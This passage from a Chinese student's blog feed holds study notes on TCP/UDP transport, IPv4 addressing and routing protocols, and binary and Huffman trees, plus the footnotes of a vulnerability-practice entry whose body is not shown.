title="靶场刷题记录"></a>靶场刷题记录</h1><p>[^asp]:ASP 文件可包含文本、HTML 标签和脚本。ASP 文件中的脚本可在服务器上执行。总结来说就是一个动态页面</p><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span>就是符号<code>#!</code>这个一般存在于shell脚本的第一行<br>[^NTFS ]: [FAT32、NTFS和exFAT的区别是什么？该如何选择？_exfat和ntfs的区别-CSDN博客](<a href="https://blog.csdn.net/qq_43003203/article/details/108463388#:~:text=1%E3%80%81FAT32%E6%A0%BC%E5%BC%8F%EF%BC%9A">https://blog.csdn.net/qq_43003203/article/details/108463388#:~:text=1、FAT32格式：</a> Windows平台的传统文件格式，Windows,95第二版首次引入，取代FAT16 (支持文件最大容量2GB)，兼容性很好，但缺点是对文件大小有限制，不支持超过4GB的文件。 所以，对于很多大型游戏、镜像文件、压缩包、视频，它是没有办法的。)<a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    
    <tags>
      
      <tag>基础漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>运输层</title>
    <link href="/2023/11/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%BF%90%E8%BE%93%E5%B1%82/"/>
    <url>/2023/11/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%BF%90%E8%BE%93%E5%B1%82/</url>
    
    <content type="html"><![CDATA[<h1 id="运输层概述"><a href="#运输层概述" class="headerlink" title="运输层概述"></a>运输层概述</h1><ol><li><p>运输层协议是端到端协议</p></li><li><p>主要的两个协议</p><p>​<code>UDP/TCP</code></p></li></ol><h1 id="运输层端口号，复用和分用的概念"><a href="#运输层端口号，复用和分用的概念" class="headerlink" title="运输层端口号，复用和分用的概念"></a>运输层端口号，复用和分用的概念</h1><ol><li><p>由于运行在电脑的进程的标识符是PID，在网络上的是不同的操作系统，使用不同格式的进程标识符</p></li><li><p>TCP&#x2F;IP使用端口号进行区分不同的应用进程</p></li><li><p>端口号是16比特</p><p>0~65535</p></li><li><p>DNS服务器</p></li></ol><p>   使用UDP协议的方式进行访问</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E8%BF%90%E8%BE%93%E5%B1%82/image-20231125114137916.png" alt="image-20231125114137916"></p><h1 id="TCP和UDP之间关系"><a href="#TCP和UDP之间关系" class="headerlink" title="TCP和UDP之间关系"></a>TCP和UDP之间关系</h1><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E8%BF%90%E8%BE%93%E5%B1%82/image-20231125115907559.png" alt="image-20231125115907559"></p><ol><li><p>UDP是不负责的，但是TCP是负责的</p><p>也就是说TCP是可靠的传输</p></li><li><p>UDP可以单播，多播，广播</p><p>但是TCP仅支持单播</p></li><li><p>TCP是全双工通信</p></li><li><p>当传输的过程中出现了误码，UDP接受方只会识别出错误，但是不会对错误做任何事情</p></li></ol><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E8%BF%90%E8%BE%93%E5%B1%82/image-20231125120619023.png" alt="image-20231125120619023"></p><h1 id="TCP的流量控制"><a href="#TCP的流量控制" class="headerlink" title="TCP的流量控制"></a>TCP的流量控制</h1><h2 id="下面是一个接收方对发送方进行流量控制的案例"><a href="#下面是一个接收方对发送方进行流量控制的案例" class="headerlink" title="下面是一个接收方对发送方进行流量控制的案例"></a>下面是一个接收方对发送方进行流量控制的案例</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E8%BF%90%E8%BE%93%E5%B1%82/image-20231125121105636.png" alt="image-20231125121105636"></p><p>最开始滑动窗口是300字节，也就是1~100，101~200，201~300分别是3个TCP数据包</p><p>从第一个开始发送 ，当发送到seq(数据的下标)&#x3D;201，数据丢失，然后使用这个时候接收方，发送</p><blockquote><p>ACK&#x3D;1       这个代表使用TCP接受信息</p><p>ack&#x3D;201这个表示该接受下表为201开始的数据了</p><p>rwnd&#x3D;300 这个表示自己的滑动窗口是300，修改发送方的滑动窗口，这个时候就达到了控制流量的目的</p></blockquote><p>接收方接受到这个消息过后，会删除1~200的缓存</p><p>当超时的时候就会重新发送201~300的数据包</p><h2 id="零窗口通知"><a href="#零窗口通知" class="headerlink" title="零窗口通知"></a>零窗口通知</h2><p>为了防止零窗口的出现，导致两方都再等对方发信息，这个时候使用零窗口通知 的方式，防止相互的等待防止死锁</p><h2 id="发送窗口的选择"><a href="#发送窗口的选择" class="headerlink" title="发送窗口的选择"></a>发送窗口的选择</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E8%BF%90%E8%BE%93%E5%B1%82/image-20231125123800879.png" alt="image-20231125123800879"></p><h1 id="TCP拥塞控制"><a href="#TCP拥塞控制" class="headerlink" title="TCP拥塞控制"></a>TCP拥塞控制</h1><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E8%BF%90%E8%BE%93%E5%B1%82/image-20231125135116386.png" alt="image-20231125135116386"></p><p>接下来我们讨论，拥塞处理的算法</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E8%BF%90%E8%BE%93%E5%B1%82/image-20231125135229152.png" alt="image-20231125135229152"></p><h2 id="慢开始-拥塞避免"><a href="#慢开始-拥塞避免" class="headerlink" title="慢开始    拥塞避免"></a>慢开始    拥塞避免</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E8%BF%90%E8%BE%93%E5%B1%82/image-20231125135415060.png" alt="image-20231125135415060"></p><p> 这个的意思就是说，发送方维护了一个拥塞窗口，拥塞窗口的大小取决于网络的好坏</p><p>当没有网络拥塞发生的时候就应该增加拥塞窗口的大小</p><p>需要设定一个满开始门限的初始值，用于判断使用什么算法，将其与发送窗口发小作对比。但是这个的结果只有两种一种是<strong>慢开始</strong>算法，另一种是<strong>拥塞避免</strong></p><p>拥塞窗口是几就可以发送几个</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E8%BF%90%E8%BE%93%E5%B1%82/image-20231125140634448.png" alt="image-20231125140634448"></p><p>下面是对拥塞控制的算法解释</p><p>先是使用慢开始算法，使其成指数增加，但是由于到达了门限值，使用拥塞避免算法，让其线性增加。当发现网络拥堵的时候，就将门限值，设置为当时滑动窗口大小的一半，让滑动窗口的大小变成一</p><h2 id="快重传"><a href="#快重传" class="headerlink" title="快重传"></a>快重传</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E8%BF%90%E8%BE%93%E5%B1%82/image-20231125141215048.png" alt="image-20231125141215048"></p><p>当发送方接收到了三个连续的对第二个的重复确认，这个时候该使用快重传，也就是重发3号数据段。这种情况下，就是提前发送了数据</p><h2 id="快恢复"><a href="#快恢复" class="headerlink" title="快恢复"></a>快恢复</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E8%BF%90%E8%BE%93%E5%B1%82/image-20231125141921096.png" alt="image-20231125141921096"></p><h2 id="四种算法的总结"><a href="#四种算法的总结" class="headerlink" title="四种算法的总结"></a>四种算法的总结</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E8%BF%90%E8%BE%93%E5%B1%82/image-20231125141842618.png" alt="image-20231125141842618"></p><h1 id="TCP超时重传时间的选择"><a href="#TCP超时重传时间的选择" class="headerlink" title="TCP超时重传时间的选择"></a>TCP超时重传时间的选择</h1><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E8%BF%90%E8%BE%93%E5%B1%82/image-20231125142845935.png" alt="image-20231125142845935"> </p><h1 id="TCP可靠传输的实现"><a href="#TCP可靠传输的实现" class="headerlink" title="TCP可靠传输的实现"></a>TCP可靠传输的实现</h1><h2 id="TCP基于以字节为单位的滑动窗口"><a href="#TCP基于以字节为单位的滑动窗口" class="headerlink" title="TCP基于以字节为单位的滑动窗口"></a>TCP基于以字节为单位的滑动窗口</h2><h3 id="发送窗口"><a href="#发送窗口" class="headerlink" title="发送窗口"></a>发送窗口</h3><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E8%BF%90%E8%BE%93%E5%B1%82/image-20231126100633800.png" alt="image-20231126100633800"></p><ol><li><p>请注意前沿和后沿的位置</p></li><li><p>后沿移动的两种状态</p><ul><li><p>向前移动</p><p>接收到了确认消息</p></li><li><p>不动</p><p>没有接收到确认信息</p></li></ul></li><li><p>前沿的移动情况</p><ul><li><p>通常是向前移动的</p><p>接受到了确认西信息，而且没有改变滑动窗口的大小，或者滑动窗口的大小变大了，或者虽然变小了，但是还是往前移动了、</p></li><li><p>不动</p><p>没有接受到新的信息</p><p>接收了新的信息，发送窗口缩小了，也就是发送窗口正好没有动</p></li><li><p>向后收缩</p><p>不太赞成这样做</p></li></ul></li><li><p>代码的编写</p><p>使用三个指针</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E8%BF%90%E8%BE%93%E5%B1%82/image-20231126101257851.png" alt="image-20231126101257851"></p></li></ol><h3 id="接收窗口"><a href="#接收窗口" class="headerlink" title="接收窗口"></a>接收窗口</h3><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E8%BF%90%E8%BE%93%E5%B1%82/image-20231126101659646.png" alt="image-20231126101659646"></p><h1 id="TCP的运输连接管理"><a href="#TCP的运输连接管理" class="headerlink" title="TCP的运输连接管理"></a>TCP的运输连接管理</h1><h2 id="TCP连接"><a href="#TCP连接" class="headerlink" title="TCP连接"></a>TCP连接</h2><h3 id="TCP三报文握手建立连接"><a href="#TCP三报文握手建立连接" class="headerlink" title="TCP三报文握手建立连接"></a>TCP三报文握手建立连接</h3><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E8%BF%90%E8%BE%93%E5%B1%82/image-20231126102441881.png" alt="image-20231126102441881"></p><ol><li><p>为什么不是两报文握手？</p><blockquote><p>注意下面这种情况</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E8%BF%90%E8%BE%93%E5%B1%82/image-20231126102612923.png" alt="image-20231126102612923"></p></li></ol><h2 id="TCP连接释放"><a href="#TCP连接释放" class="headerlink" title="TCP连接释放"></a>TCP连接释放</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E8%BF%90%E8%BE%93%E5%B1%82/image-20231126104238075.png" alt="image-20231126104238075"></p><h2 id="保活计时器"><a href="#保活计时器" class="headerlink" title="保活计时器"></a>保活计时器</h2><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>就是为了防止TCP客户端出现错误之后，服务端一直等待</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E8%BF%90%E8%BE%93%E5%B1%82/image-20231126104712837.png" alt="image-20231126104712837"></p><h1 id="首部格式"><a href="#首部格式" class="headerlink" title="首部格式"></a>首部格式</h1><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E8%BF%90%E8%BE%93%E5%B1%82/image-20231126104818299.png" alt="image-20231126104818299"></p><h2 id="源端口"><a href="#源端口" class="headerlink" title="源端口"></a>源端口</h2><p>用于标识发送该TCP报文的应用进程</p><h2 id="目的的端口号"><a href="#目的的端口号" class="headerlink" title="目的的端口号"></a>目的的端口号</h2><p>用来标志接受TCP的报文段的应用进程</p><h2 id="序号字段"><a href="#序号字段" class="headerlink" title="序号字段"></a>序号字段</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E8%BF%90%E8%BE%93%E5%B1%82/image-20231126105115130.png" alt="image-20231126105115130"></p><h2 id="确认号"><a href="#确认号" class="headerlink" title="确认号"></a>确认号</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E8%BF%90%E8%BE%93%E5%B1%82/image-20231126105142053.png" alt="image-20231126105142053"></p><h2 id="窗口"><a href="#窗口" class="headerlink" title="窗口"></a>窗口</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E8%BF%90%E8%BE%93%E5%B1%82/image-20231126105335001.png" alt="image-20231126105335001"></p><p>应该从接受窗口中和发送窗口中取小者</p>]]></content>
    
    
    
    <tags>
      
      <tag>计算机网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>网络层</title>
    <link href="/2023/11/06/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%B1%82/"/>
    <url>/2023/11/06/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%B1%82/</url>
    
    <content type="html"><![CDATA[<h1 id="需要解决的问题"><a href="#需要解决的问题" class="headerlink" title="需要解决的问题"></a>需要解决的问题</h1><ul><li>提供什么样的服务（可靠or不可靠）</li><li>网络寻址问题</li><li>路由选择</li></ul><h1 id="网络层提供的两种服务"><a href="#网络层提供的两种服务" class="headerlink" title="网络层提供的两种服务"></a>网络层提供的两种服务</h1><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20231108103506026.png" alt="image-20231108103506026"></p><h1 id="IPV4地址"><a href="#IPV4地址" class="headerlink" title="IPV4地址"></a>IPV4地址</h1><h2 id="分类编制的IPV4地址"><a href="#分类编制的IPV4地址" class="headerlink" title="分类编制的IPV4地址"></a>分类编制的IPV4地址</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20231108103941237.png" alt="image-20231108103941237"></p><p>只有A,B,C类可以使用</p><p>主机号全为1 的是广播地址</p><p>主机号全为0的是网络地址</p><h3 id="A类地址"><a href="#A类地址" class="headerlink" title="A类地址"></a>A类地址</h3><p>A类地址的最大网络号是127，这个也不能使用，作为本地测试地址</p><p>当主机号为1，就是最小的本地测试地址127.0.0.1</p><h3 id="B类地址"><a href="#B类地址" class="headerlink" title="B类地址"></a>B类地址</h3><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20231108104612438.png" alt="image-20231108104612438"></p><h3 id="C类地址"><a href="#C类地址" class="headerlink" title="C类地址"></a>C类地址</h3><p>最小的网络号：192 </p><h3 id="判断网络类别"><a href="#判断网络类别" class="headerlink" title="判断网络类别"></a>判断网络类别</h3><ul><li>小于127的是A类</li><li>128~191是B类</li><li>192~223是C类</li></ul><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20231108105110632.png" alt="image-20231108105110632"></p><h2 id="划分IPV4地址"><a href="#划分IPV4地址" class="headerlink" title="划分IPV4地址"></a>划分IPV4地址</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20231108105635744.png" alt="image-20231108105635744"></p><p>由于对一个网段再分，可以使用主机号的部分作为网络号。为了方便计算机和人类知道需要借用子网掩码的形式</p><p>如果子网掩码是255.255.255.128<br>将最后8位的地址化为2进制为：10000000<br>这个就是是我们借用了，最高位作为网络号</p><h3 id="默认的子网掩码"><a href="#默认的子网掩码" class="headerlink" title="默认的子网掩码"></a>默认的子网掩码</h3><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20231108110411031.png" alt="image-20231108110411031"></p><h2 id="CIDR"><a href="#CIDR" class="headerlink" title="CIDR"></a>CIDR</h2><p>就是使用’&#x2F;‘表示出网络号的多少</p><p>比如206.0.64.8&#x2F;18就是使用18位网络号</p><h2 id="路由聚合"><a href="#路由聚合" class="headerlink" title="路由聚合"></a>路由聚合</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20231108112159886.png" alt="image-20231108112159886"></p><p>将相同的网络前缀作为网络块</p><h2 id="应用规划"><a href="#应用规划" class="headerlink" title="应用规划"></a>应用规划</h2><p>通常使用两种方法</p><h3 id="定长的子网掩码FLSM"><a href="#定长的子网掩码FLSM" class="headerlink" title="定长的子网掩码FLSM"></a>定长的子网掩码FLSM</h3><p>使用同一个子网掩码分配IP</p><p>会产生大量的浪费</p><p>因为某一个子网只需要4个但是如果给他32个就会造成浪费</p><h3 id="边长的子网掩码VLSM"><a href="#边长的子网掩码VLSM" class="headerlink" title="边长的子网掩码VLSM"></a>边长的子网掩码VLSM</h3><p>使用边长的子网掩码，会减少ip的浪费</p><h1 id="IP数据报的发送和转发"><a href="#IP数据报的发送和转发" class="headerlink" title="IP数据报的发送和转发"></a>IP数据报的发送和转发</h1><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20231108113605590.png" alt="image-20231108113605590"></p><p>在同一个子网的IP可以直接通信</p><p>不同子网的IP需要通过路由器转发     </p><h2 id="查表转发"><a href="#查表转发" class="headerlink" title="查表转发"></a>查表转发</h2><p>当处于不同的子网时，需要间接交付，该主机走默认网关</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20231108114636014.png" alt="image-20231108114636014"></p><p>假设现在A-&gt;D<br>A就会发现D不是和自己是一个子网，需要间接交付，也就是说，需要使用使用默认网关<br>当数据报发送到R的时候，会检测数据报是否存在问题，如有问题就会被抛弃，反之会查找表，将目的地址与地址掩码想  <strong>与</strong>然后就会得到目的网络的默认网关，查找路由表，数据报就能进行转发了</p><p>如果A发送了一个广播，那么路由器R就不会转发</p><h1 id="静态路由配置及其可能产生的路由环路问题"><a href="#静态路由配置及其可能产生的路由环路问题" class="headerlink" title="静态路由配置及其可能产生的路由环路问题"></a>静态路由配置及其可能产生的路由环路问题</h1><h2 id="默认路由"><a href="#默认路由" class="headerlink" title="默认路由"></a>默认路由</h2><p>对于具有相同吓一跳的网络，可以使用一条默认路由代替</p><h2 id="特定主机路由"><a href="#特定主机路由" class="headerlink" title="特定主机路由"></a>特定主机路由</h2><p>就是将特定的一个网络添加到路由表当中 </p><p>有时候需要考虑安全问题的时候就需要添加特定的主机路由</p><h2 id="差别"><a href="#差别" class="headerlink" title="差别"></a>差别</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20231113141341915.png" alt="image-20231113141341915"></p><h2 id="黑洞路由"><a href="#黑洞路由" class="headerlink" title="黑洞路由"></a>黑洞路由</h2><p>当路由器使用该端口数据包就有去无回了，可以理解为丢弃数据报</p><h1 id="路由选择协议"><a href="#路由选择协议" class="headerlink" title="路由选择协议"></a>路由选择协议</h1><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20231113142122192.png" alt="image-20231113142122192"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20231113142332812.png" alt="image-20231113142332812"></p><h2 id="RIP"><a href="#RIP" class="headerlink" title="RIP"></a>RIP</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20231113142618392.png" alt="image-20231113142618392"></p><p>在这个协议当中，当经过的路由器少就是最好的</p><p>当遇到相等的距离的时候</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20231113142806243.png" alt="image-20231113142806243"></p><p>RIP包含的以下三个要点</p><ul><li>仅仅和相邻的路由器交换信息</li><li>交换自己的路由表</li><li>周期性的交换信息</li></ul><h3 id="基本工作流程"><a href="#基本工作流程" class="headerlink" title="基本工作流程"></a>基本工作流程</h3><h4 id="更新规则"><a href="#更新规则" class="headerlink" title="更新规则"></a>更新规则</h4><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20231113143229570.png" alt="image-20231113143229570"></p><p>请注意相同的额吓一跳的时候应该更新改造过后的路由表</p><p>当两条记录的距离相同也要添加到路由表</p><h3 id="存在的问题"><a href="#存在的问题" class="headerlink" title="存在的问题"></a>存在的问题</h3><h4 id="坏消息传得慢"><a href="#坏消息传得慢" class="headerlink" title="坏消息传得慢"></a>坏消息传得慢</h4><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20231113143550554.png" alt="image-20231113143550554"></p><p>只有当距离添加到16时才知道不可达</p><h2 id="OSPF"><a href="#OSPF" class="headerlink" title="OSPF"></a>OSPF</h2><p>开放最短路径优先</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20231113144044456.png" alt="image-20231113144044456"></p><h2 id="BGP"><a href="#BGP" class="headerlink" title="BGP"></a>BGP</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20231113145859507.png" alt="image-20231113145859507"></p><h3 id="四种报文"><a href="#四种报文" class="headerlink" title="四种报文"></a>四种报文</h3><p>边界网关协议也就是在不同的区域之间传递信息的时候需要使用的</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20231113150033169.png" alt="image-20231113150033169"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20231113150252978.png" alt="image-20231113150252978"></p><h1 id="IPV4数据报的首部格式"><a href="#IPV4数据报的首部格式" class="headerlink" title="IPV4数据报的首部格式"></a>IPV4数据报的首部格式</h1><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20231113151013907.png" alt="image-20231113151013907"></p><h2 id="大小"><a href="#大小" class="headerlink" title="大小"></a>大小</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20231113152711604.png" alt="image-20231113152711604"></p><p>固定的部分时20字节，可变的部分是40字节</p><h2 id="首部长度"><a href="#首部长度" class="headerlink" title="首部长度"></a>首部长度</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20231113152959276.png" alt="image-20231113152959276"></p><p>最小十进制为5，表示只有20字节的固定的部分</p><h2 id="区分服务"><a href="#区分服务" class="headerlink" title="区分服务"></a>区分服务</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20231113153110097.png" alt="image-20231113153110097"></p><h2 id="Ipv4数据报分片"><a href="#Ipv4数据报分片" class="headerlink" title="Ipv4数据报分片"></a>Ipv4数据报分片</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20231113151751574.png" alt="image-20231113151751574"></p><p>MF为0代表这个时最后一个分片</p><p>DF为0表示还可以分片</p><h2 id="TTL生存时间"><a href="#TTL生存时间" class="headerlink" title="TTL生存时间"></a>TTL生存时间</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20231113151919990.png" alt="image-20231113151919990"></p><p>为了防止在路由环路中永久的兜圈</p><h2 id="协议字段"><a href="#协议字段" class="headerlink" title="协议字段"></a>协议字段</h2><p>常用的协议：</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20231113152131036.png" alt="image-20231113152131036"></p><h2 id="首部检验和"><a href="#首部检验和" class="headerlink" title="首部检验和"></a>首部检验和</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20231113152222117.png" alt="image-20231113152222117"></p><h1 id="网际控制报文协议ICMP"><a href="#网际控制报文协议ICMP" class="headerlink" title="网际控制报文协议ICMP"></a>网际控制报文协议ICMP</h1><p>五种报文：</p><ul><li>终点不可达</li><li>源点抑制</li><li>时间超过</li><li>参数问题</li><li>改变路由</li></ul><h2 id="终点不可达"><a href="#终点不可达" class="headerlink" title="终点不可达"></a>终点不可达</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20231118174411108.png" alt="image-20231118174411108"></p><h2 id="源点抑制"><a href="#源点抑制" class="headerlink" title="源点抑制"></a>源点抑制</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20231118174553673.png" alt="image-20231118174553673"></p><h2 id="时间超过"><a href="#时间超过" class="headerlink" title="时间超过"></a>时间超过</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20231118174701324.png" alt="image-20231118174701324"></p><h2 id="参数问题"><a href="#参数问题" class="headerlink" title="参数问题"></a>参数问题</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E7%BD%91%E7%BB%9C%E5%B1%82/image-20231118174855848.png" alt="image-20231118174855848"></p><h2 id="应用举例"><a href="#应用举例" class="headerlink" title="应用举例"></a>应用举例</h2><ol><li>ping</li><li>tracert(win)</li></ol><h1 id="虚拟专用网VPN和网址转换协议NAT的基本原理"><a href="#虚拟专用网VPN和网址转换协议NAT的基本原理" class="headerlink" title="虚拟专用网VPN和网址转换协议NAT的基本原理"></a>虚拟专用网VPN和网址转换协议NAT的基本原理</h1><h2 id="VPN"><a href="#VPN" class="headerlink" title="VPN"></a>VPN</h2><h2 id="NAT"><a href="#NAT" class="headerlink" title="NAT"></a>NAT</h2><p>一般加端口好负责区分不同的主机</p>]]></content>
    
    
    
    <tags>
      
      <tag>计算机网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数据结构复习随机</title>
    <link href="/2023/11/05/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E9%9A%8F%E8%AE%B0/"/>
    <url>/2023/11/05/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E9%9A%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="树"><a href="#树" class="headerlink" title="树"></a>树</h1><h2 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h2><ol><li><p>二叉树每一层最多的节点数为</p><p>2^n-1^</p></li><li><p>满二叉树</p><p>一颗树的层数为k那么他的总的节点是</p><p>2^k-1^</p></li><li><p>完全二叉树</p><p>编号与满二叉树的编号相等</p><p>先左后右</p></li><li><p>任何一棵二叉树，度为2的节点数总是比叶子节点数少1</p></li><li><p>分支节点是非叶子节点</p></li><li><p>对于满二叉树来说<br>满二叉树的一个重要性质是叶节点的数量（m）总是比分枝节点的数量（k）多1</p></li><li><p>完全二叉树当中</p><p>左节点是2i</p><p>右节点是2i+1</p></li><li><p>含有n个结点的二叉树采用二叉链表存储时，空指针域的个数为 n+1</p></li><li><p>将一颗树转化为二叉树，根结点没有右子树。</p></li><li><p>二叉树有5种形态</p></li></ol><h2 id="哈夫曼树"><a href="#哈夫曼树" class="headerlink" title="哈夫曼树"></a>哈夫曼树</h2><ol><li><p>对于一棵有n个叶子节点的哈夫曼树，它的节点总数是2n-1。</p></li><li><p>哈夫曼树的构建过程是基于权值的：权值较小的节点离根节点较远，权值较大的节点离根节点较近。</p></li><li><p>从上往下</p><p>左为0，右边为1</p></li><li><p>将一棵树T转换为一颗二叉树T2，则T的先序遍历是T2的<strong>先序</strong></p></li><li><p>将一棵树T转换为一颗二叉树T2，则T的后序遍历是T2的<strong>中序</strong></p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>数据结构</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数据结构复习随机</title>
